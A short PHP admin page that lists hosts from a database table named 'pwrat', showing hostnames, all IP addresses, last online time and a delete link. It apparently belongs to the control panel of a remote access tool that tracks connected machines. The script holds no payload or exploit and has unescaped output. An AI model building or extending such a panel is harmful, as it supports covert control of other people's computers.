<?php
require("config.php");
$mysqli = new mysqli("localhost",$username,$password,"yourdbname");
if(mysqli_connect_error())
{
	printf("database connection error:%s\n",mysqli_connect_error());
	exit();
}

if(isset($_SESSION["admin"]))
{
	echo '<div id="table">';
	echo '<table>';
	echo '<th>id</th><th>HostName</th><th>all IP（include lan,ipv4,ipv6）</th><th>recent online time</th><th>action</th>';
	$result = $mysqli->query("SELECT * FROM pwrat");
	while($row = $result->fetch_assoc())
	{
		echo '<tr>';
		echo '<td>'.$row["id"].'</td>';
		echo '<td>'.$row["name"].'</td>';
		echo '<td>'.$row["IP"].'</td>';
		echo '<td>'.$row["lasttime"].'</td>';	
		echo '<td><a href=del.php?id='.$row["id"].'>delete</a></td>';
		echo '</tr>';
	}
	echo '</table></div>';
	
}

$mysqli->close();
?>